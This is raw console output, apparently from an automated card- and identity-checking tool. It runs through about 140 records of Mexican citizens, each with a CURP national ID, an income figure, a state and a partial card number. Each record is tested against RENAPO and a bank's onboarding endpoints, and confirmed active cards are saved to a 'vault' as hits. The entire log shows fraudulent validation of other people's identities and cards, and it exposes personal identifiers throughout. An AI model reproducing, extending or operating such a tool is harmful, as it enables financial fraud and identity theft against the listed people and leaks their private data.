[1330] ID:3911694 | VAMF690616MJCLCB09 | $187,260 | JALISCO | T:0678... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE170) (16.4s)
[1331] ID:125597 | GACE690603HTSRBN03 | $187,200 | TAMAULIPAS | T:6558... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[1332] ID:199796 | QUMD700426HVRJNL06 | $187,200 | VERACRUZ | T:4061... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[1333] ID:375331 | GACS770118MVRRRS06 | $187,200 | VERACRUZ | T:5853... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.1s)
[1334] ID:401471 | RORI690413MGTDMR06 | $187,200 | GUANAJUATO | T:9541... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.8s)
[1335] ID:659477 | GUMK790528MGTTNR07 | $187,200 | GUANAJUATO | T:1447... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.2s)
[1336] ID:1545159 | SAHR770921HMCLRF05 | $187,200 | ESTADO DE ME | T:9124... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[1337] ID:1662379 | GOSJ710402HASNRS01 | $187,200 | AGUASCALIENT | T:1672... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (16.8s)
[1338] ID:2049725 | MAHJ731201HPLCRR07 | $187,200 | PUEBLA | T:1871... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9541 para ID:401471 ($187,200)... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.2s)
[1339] ID:2930941 | NOMS750807MSORLL04 | $187,200 | SONORA | T:5525... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (15.2s)
[1340] ID:3118789 | GOMG721126HJCMRR07 | $187,200 | JALISCO | T:4251... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1871 para ID:2049725 ($187,200)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.1s)
[1341] ID:853799 | OAOR740127HDFGLY00 | $187,180 | CIUDAD DE ME | T:8830... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE1002) (14.0s)
[1342] ID:1841362 | TORL740218HJCRDS08 | $187,180 | JALISCO | T:8987... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.3s)
[1343] ID:3599242 | VAGJ730226HTSSNN04 | $187,140 | TAMAULIPAS | T:2047... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (8.9s)
[1344] ID:74906 | MAAM010101HMCTRMA1 | $187,110 | ESTADO DE ME | T:3068... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8987 para ID:1841362 ($187,180)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[1345] ID:2365183 | LOZC750709MMCPVN01 | $187,110 | ESTADO DE ME | T:7001... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.1s)
[1346] ID:3911734 | CAMJ710323HVRRLN05 | $187,110 | VERACRUZ | T:1452... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[1347] ID:1603157 | UERV740611MPLRZR09 | $187,090 | PUEBLA | T:2784... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.5s)
[1348] ID:2597745 | MARA701029HMCRZL06 | $187,090 | ESTADO DE ME | T:9375... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1349] ID:2038537 | GUPF750106HCHJRR03 | $187,060 | CHIHUAHUA | T:4198... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.6s)
[1350] ID:3117955 | GOCJ731105HNLNBN04 | $187,050 | NUEVO LEON | T:9614... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1351] ID:2258260 | RUOA741020HDFZLL03 | $187,040 | CIUDAD DE ME | T:5197... [🔴 OFF] Rechazo bancario (PE110) (15.3s)
[1352] ID:175323 | ROTR740301MDFDRC09 | $187,000 | CIUDAD DE ME | T:7088... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.1s)
[1353] ID:755550 | PEMM731020MDFRRR00 | $187,000 | CIUDAD DE ME | T:8064... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.2s)
[1354] ID:832214 | AESO721212MOCLMS04 | $187,000 | OAXACA | T:2777... [🔴 OFF] Contacto preexistente (/confirm-contact) (11.0s)
[1355] ID:1005166 | GAVN691110HDFRGX08 | $187,000 | CIUDAD DE ME | T:3819... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.9s)
[1356] ID:1252922 | ROHC700129HNLDRL06 | $187,000 | NUEVO LEON | T:5382... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.4s)
[1357] ID:1414760 | BICK731104MQRRBR07 | $187,000 | QUINTANA ROO | T:4190... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.2s)
[1358] ID:1486049 | BANJ691225HYCRHS01 | $187,000 | YUCATAN | T:3583... [🔴 OFF] Contacto preexistente (/confirm-contact) (9.8s)
[1359] ID:2215444 | NAAC690620MDFMBR04 | $187,000 | CIUDAD DE ME | T:6692... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.7s)
[1360] ID:2702080 | GURC730105MVRZDR00 | $187,000 | VERACRUZ | T:7334... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[1361] ID:2851100 | EUIS730113HNLSBN02 | $187,000 | NUEVO LEON | T:6703... [🔴 OFF] Rechazo bancario (PE040) (12.0s)
[1362] ID:2930154 | BOMR750510HCGHRD05 | $187,000 | COAHUILA | T:2675... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (7.0s)
[1363] ID:3052854 | HUAH700824MTSRLR02 | $187,000 | TAMAULIPAS | T:1855... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6703 para ID:2851100 ($187,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.3s)
[1364] ID:3191483 | RACM720913MDFNNN01 | $187,000 | CIUDAD DE ME | T:5997... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (10.0s)
[1365] ID:3539965 | COOO770318HJCNSM02 | $187,000 | JALISCO | T:7647... [🔴 OFF] Contacto preexistente (/confirm-contact) (11.8s)
[1366] ID:3621729 | CAEV701120HYCNSC09 | $187,000 | YUCATAN | T:6953... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.2s)
[1367] ID:3742835 | ZASE731028MMCRTR01 | $187,000 | ESTADO DE ME | T:3268... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (1.9s)
[1368] ID:4575473 | OENS800320HBSRRR01 | $187,000 | BAJA CALIFOR | T:2733... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (12.5s)
[1369] ID:4838856 | RAPA690709MMCMRL04 | $187,000 | ESTADO DE ME | T:0347... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.2s)
[1370] ID:4844656 | CUCE700706MDFRHL08 | $187,000 | CIUDAD DE ME | T:9106... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (8.1s)
[1371] ID:3200377 | LOMC710403HJCPRR06 | $186,970 | JALISCO | T:5683... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2733 para ID:4575473 ($187,000)... [🔴 OFF] Rechazo bancario (PE160) (7.2s)
[1372] ID:912001 | MAMR700727HCHRRL07 | $186,900 | CHIHUAHUA | T:0066... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (9.4s)
[1373] ID:1655871 | RACM720913MDFNNN01 | $186,900 | CIUDAD DE ME | T:6662... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9106 para ID:4844656 ($187,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (10.1s)
[1374] ID:3458015 | RIGJ771230HNLVMV09 | $186,900 | NUEVO LEON | T:4595... [🔴 OFF] Contacto preexistente (/confirm-contact) (10.5s)
[1375] ID:3747111 | BELF730922HQTSLR01 | $186,880 | QUERETARO | T:0369... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.3s)
[1376] ID:1569863 | PAHD731010HGRCRG00 | $186,860 | GUERRERO | T:2631... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE110) (11.3s)
[1377] ID:1897291 | ROOM730226MOCSSR00 | $186,850 | OAXACA | T:9905... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (11.1s)
[1378] ID:274204 | GAJA700630HDFRML06 | $186,800 | CIUDAD DE ME | T:6702... [🔴 OFF] Contacto preexistente (/confirm-contact) (10.2s)
[1379] ID:246383 | AUYM740114HVRGNR02 | $186,750 | VERACRUZ | T:0309... [🔴 OFF] Rechazo bancario (PE160) (8.1s)
[1380] ID:775414 | AADD720911HASLLV00 | $186,740 | AGUASCALIENT | T:2310... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.2s)
[1381] ID:3026574 | CARF710513HDFZHR09 | $186,710 | CIUDAD DE ME | T:1314... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.4s)
[1382] ID:46821 | LAFM700909HCGRLG06 | $186,660 | COAHUILA | T:2037... [🔴 OFF] Contacto preexistente (/confirm-contact) (9.5s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (1.9s)
[1383] ID:3379336 | SIMR700315HMCLDF00 | $186,660 | ESTADO DE ME | T:2364... [1384] ID:225389 | GAMR730415HMCRNG02 | $186,640 | ESTADO DE ME | T:7847... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (1.9s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.0s)
[1385] ID:3383223 | UIGD720613HDFLMG00 | $186,630 | CIUDAD DE ME | T:4006... [1386] ID:1418909 | AASJ750112HMCLGS01 | $186,620 | ESTADO DE ME | T:5168... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.7s)
[1387] ID:4488203 | ROHL691114HJCMRS04 | $186,620 | JALISCO | T:8076... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (10.3s)
[1388] ID:4057348 | MASL730220HMCNLS08 | $186,530 | ESTADO DE ME | T:5959... [🔴 OFF] Contacto preexistente (/confirm-contact) (10.0s)
[1389] ID:2112717 | BEGT700403HCGLRM00 | $186,510 | COAHUILA | T:6625... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.6s)
[1390] ID:1420017 | MAMR711129HMNDNM06 | $186,420 | MICHOACAN | T:6258... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.6s)
[1391] ID:3977311 | ROHF720720HCPMRR01 | $186,420 | CAMPECHE | T:8969... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (9.5s)
[1392] ID:3348756 | AIAA731221HYCLCR04 | $186,410 | YUCATAN | T:9542... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5959 para ID:4057348 ($186,530)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.0s)
[1393] ID:202047 | EUGJ700516HJCQNN06 | $186,340 | JALISCO | T:5495... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
[1394] ID:383992 | OOHA750808MDFRYN04 | $186,340 | CIUDAD DE ME | T:0959... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (7.8s)
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (10.2s)
[1395] ID:224502 | CECK711027MMCDRR05 | $186,320 | ESTADO DE ME | T:3488... [1396] ID:294639 | SAMD700905HNTLNV09 | $186,320 | NAYARIT | T:6862... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0959 para ID:383992 ($186,340)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[1397] ID:3910356 | SERG690120HMCGMB07 | $186,320 | ESTADO DE ME | T:8894... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.5s)
[1398] ID:2414596 | AOMJ691210HHGBNS08 | $186,300 | HIDALGO | T:8277... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.7s)
[1399] ID:3678275 | CASH700802HDFLLR01 | $186,300 | CIUDAD DE ME | T:4738... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6862 para ID:294639 ($186,320)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (7.7s)
[1400] ID:1998034 | MOTA691112HDFRRR04 | $186,250 | CIUDAD DE ME | T:0613... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (1.8s)
[1401] ID:2263588 | AUAM691013MDFLLT07 | $186,240 | CIUDAD DE ME | T:8128... [🔴 OFF] Contacto preexistente (/confirm-contact) (10.6s)
[1402] ID:4249298 | EUGJ700516HJCQNN06 | $186,240 | JALISCO | T:1699... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (7.6s)
[1403] ID:748101 | MEVF731116HGTNRR06 | $186,200 | GUANAJUATO | T:7274... [🟢 HIT #7] Tarjeta ACTIVA Confirmada -> Guardado en bóveda!

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8277 para ID:2414596 ($186,300)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (9.0s)
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (11.4s)
[1404] ID:1973295 | HEAS691108MMCRLG01 | $186,140 | ESTADO DE ME | T:8820... [1405] ID:970088 | JAGL740517MVRCNZ01 | $186,120 | VERACRUZ | T:0861... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (1.8s)
[1406] ID:1553503 | AUPJ700323MMCGRR06 | $186,120 | ESTADO DE ME | T:1835... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.5s)
[1407] ID:1609676 | AARR721023MDFLMB06 | $186,120 | CIUDAD DE ME | T:2740... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8128 para ID:2263588 ($186,240)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (7.6s)
[1408] ID:2416900 | JUGC770921HPLRNR08 | $186,120 | PUEBLA | T:9146... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7274 para ID:748101 ($186,200)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (9.2s)
[1409] ID:3263455 | RAVS711102MDFMLN07 | $186,110 | CIUDAD DE ME | T:8466... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[1410] ID:593847 | RAMG690423MMCMRR04 | $186,090 | ESTADO DE ME | T:4797... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (1.8s)
[1411] ID:2229533 | KIKR720106HTCSLD09 | $186,070 | TABASCO | T:3672... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[1412] ID:437104 | TAMA760718HMCVCL00 | $186,000 | ESTADO DE ME | T:9502... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.1s)
[1413] ID:446127 | MECC690326HQRSRS09 | $186,000 | QUINTANA ROO | T:2787... [🔴 OFF] Contacto preexistente (/confirm-contact) (9.9s)
[1414] ID:473871 | HELR690218HMCRPF04 | $186,000 | ESTADO DE ME | T:4789... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.3s)
[1415] ID:513107 | AARR720818MJCNYB09 | $186,000 | JALISCO | T:3634... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2740 para ID:1609676 ($186,120)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.0s)
[1416] ID:872630 | COCL740522HVRNBS05 | $186,000 | VERACRUZ | T:9090... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.3s)
[1417] ID:945629 | CABC730811HMSSRR09 | $186,000 | MORELOS | T:5357... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.3s)
[1418] ID:946615 | AAAR780116HDFLBC01 | $186,000 | CIUDAD DE ME | T:4148... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.7s)
[1419] ID:1064252 | CARH791231HJCHVG01 | $186,000 | JALISCO | T:9826... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9146 para ID:2416900 ($186,120)... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.4s)
[1420] ID:1219879 | COMK740226MSOTRR06 | $186,000 | SONORA | T:1590... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.2s)
[1421] ID:1410816 | AEBR701213MSORLS07 | $186,000 | SINALOA | T:1459... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (1.8s)
[1422] ID:1477473 | NOGJ780317HMCLNS06 | $186,000 | ESTADO DE ME | T:1915... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.9s)
[1423] ID:2058874 | MOSG740608HTSRNN06 | $186,000 | TAMAULIPAS | T:5879... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.7s)
[1424] ID:2407587 | GORM741111HTCMSG05 | $186,000 | TABASCO | T:5684... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9826 para ID:1064252 ($186,000)... [🔴 OFF] Rechazo bancario (PE170) (10.5s)
[1425] ID:2440742 | POBF711202HBSRLB09 | $186,000 | BAJA CALIFOR | T:0011... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (11.2s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.1s)
[1426] ID:2516495 | GASH740429HJCRRR01 | $186,000 | JALISCO | T:2500... [1427] ID:2626750 | COMM690429MQRTRR02 | $186,000 | QUINTANA ROO | T:1390... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (1.9s)
[1428] ID:2782989 | RIHG740117HMNCRL01 | $186,000 | MICHOACAN | T:5487... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.1s)
[1429] ID:3004468 | EICA740407HTSSSL09 | $186,000 | TAMAULIPAS | T:9164... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (7.2s)
[1430] ID:3119949 | TOMJ730115HDFRDV00 | $186,000 | CIUDAD DE ME | T:6488... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9164 para ID:3004468 ($186,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (9.7s)
[1431] ID:3246434 | CALM711025HNLHLR04 | $186,000 | NUEVO LEON | T:7031... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.7s)
[1432] ID:4194744 | GIZJ721220HTCLRN03 | $186,000 | TABASCO | T:5271... [🔴 OFF] Contacto preexistente (/confirm-contact) (10.9s)
[1433] ID:4237012 | MARD700916HNLRSN02 | $186,000 | NUEVO LEON | T:4500... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5487 para ID:2782989 ($186,000)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.1s)
[1434] ID:4654552 | SELM691124HNLNZR08 | $186,000 | NUEVO LEON | T:2722... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (1.6s)
[1435] ID:4884939 | TEPL720621HDFRCS00 | $186,000 | CIUDAD DE ME | T:2907... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6488 para ID:3119949 ($186,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (12.3s)
[1436] ID:52626 | VAMR690124HBCZZB02 | $185,980 | BAJA CALIFOR | T:5262... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.7s)
[1437] ID:1248316 | SAOC721212HCHNCR03 | $185,970 | CHIHUAHUA | T:6952... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.1s)
[1438] ID:2839671 | SADA711016HSORMV00 | $185,970 | SINALOA | T:8795... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5271 para ID:4194744 ($186,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (12.1s)
[1439] ID:4699715 | MEME720405HDFYRR03 | $185,970 | CIUDAD DE ME | T:8294... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.1s)
[1440] ID:4482137 | LUHJ010101HMCCRSA4 | $185,960 | ESTADO DE ME | T:5227... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.4s)
[1441] ID:2834221 | MAAR690504HDFRLC05 | $185,940 | CIUDAD DE ME | T:2308... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.0s)
[1442] ID:2851396 | HULG781224MYCSZL04 | $185,920 | YUCATAN | T:2378... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[1443] ID:1770141 | GAQM690206HJCRNG02 | $185,910 | JALISCO | T:3096... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2907 para ID:4884939 ($186,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (14.0s)
[1444] ID:5085 | CACH780706HNLSSR06 | $185,900 | NUEVO LEON | T:7896... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.5s)
[1445] ID:4748246 | LOAS741219MDFZLL03 | $185,900 | CIUDAD DE ME | T:4199... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2308 para ID:2834221 ($185,940)... [🔴 OFF] Rechazo bancario (PE170) (13.7s)
[1446] ID:2039915 | MACS690923HNLRPM07 | $185,830 | NUEVO LEON | T:4959... [🔴 OFF] Contacto preexistente (/confirm-contact) (12.1s)
[1447] ID:1959050 | BAAG720121HDFRGL04 | $185,810 | CIUDAD DE ME | T:6559... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (3.8s)
[1448] ID:2452262 | VIBT700628MCSLRR01 | $185,760 | CHIAPAS | T:7193... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[1449] ID:1846479 | NADJ701124HMCZRN03 | $185,650 | ESTADO DE ME | T:2913... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3096 para ID:1770141 ($185,910)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[1450] ID:2454149 | MAEA730526MDFRSD02 | $185,640 | CIUDAD DE ME | T:6378... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.0s)
[1451] ID:2840134 | JAMS740923MPLLRN05 | $185,600 | PUEBLA | T:8970... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.2s)
[1452] ID:2229208 | LAAL690923HMCLVL02 | $185,590 | ESTADO DE ME | T:2768... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6559 para ID:1959050 ($185,810)... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.2s)
[1453] ID:2689285 | FOZA701209MDFLMN07 | $185,520 | CIUDAD DE ME | T:7484... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[1454] ID:4512632 | FOOS010101HMNLRSA5 | $185,490 | MICHOACAN | T:5344... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.6s)
[1455] ID:229252 | PESC690924HNLDNR00 | $185,450 | NUEVO LEON | T:0684... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.8s)
[1456] ID:1234309 | GOAD741229HSPMRV04 | $185,440 | SAN LUIS POT | T:6277... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8970 para ID:2840134 ($185,600)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[1457] ID:4093757 | HECN750510MVRRMN06 | $185,440 | VERACRUZ | T:9863... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[1458] ID:3669452 | MIBD710530HNLLRN02 | $185,410 | NUEVO LEON | T:1186... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7484 para ID:2689285 ($185,520)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (16.9s)
[1459] ID:258871 | CAAL720406MDFRRZ00 | $185,400 | CIUDAD DE ME | T:8968... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0684 para ID:229252 ($185,450)... [🔴 OFF] Contacto preexistente (/confirm-contact) (18.6s)
[1460] ID:1693165 | AABE701204HTSBLR03 | $185,400 | TAMAULIPAS | T:3829... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.7s)
[1461] ID:1672808 | CUMJ750303HMCLNV02 | $185,280 | ESTADO DE ME | T:4833... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[1462] ID:1467161 | RAMG690423MMCMRR04 | $185,260 | ESTADO DE ME | T:3187... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[1463] ID:1965725 | NABE691025MGTVTD05 | $185,250 | GUANAJUATO | T:4027... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE170) (13.2s)
[1464] ID:4061372 | GAHL730329MGTRRR00 | $185,250 | GUANAJUATO | T:3544... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8968 para ID:258871 ($185,400)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[1465] ID:189231 | RABA710608MMCMZR01 | $185,220 | ESTADO DE ME | T:7374... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1466] ID:4355952 | MOBF690102MMNJRN04 | $185,210 | MICHOACAN | T:6075... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.7s)
[1467] ID:2949412 | EAVL690801HGTSLN07 | $185,150 | GUANAJUATO | T:3355... [🔴 OFF] Rechazo bancario (PE110) (16.6s)
[1468] ID:3992244 | HEGA710913HMCRRN00 | $185,100 | ESTADO DE ME | T:7062... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (12.7s)
[1469] ID:3970260 | GAGA710129MCGLRN01 | $185,090 | COAHUILA | T:6627... [🔴 OFF] Rechazo bancario (PE160) (14.8s)
[1470] ID:787164 | GAFJ790201HDFRRN03 | $185,030 | CIUDAD DE ME | T:0723... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.5s)
[1471] ID:256144 | JURF701102MDFRMB01 | $185,000 | CIUDAD DE ME | T:5049... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (9.2s)
[1472] ID:492033 | VAVX731210HNLLLN00 | $185,000 | NUEVO LEON | T:3637... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0723 para ID:787164 ($185,030)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1473] ID:509121 | ROPO771201HDFDRC08 | $185,000 | CIUDAD DE ME | T:5721... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (14.1s)
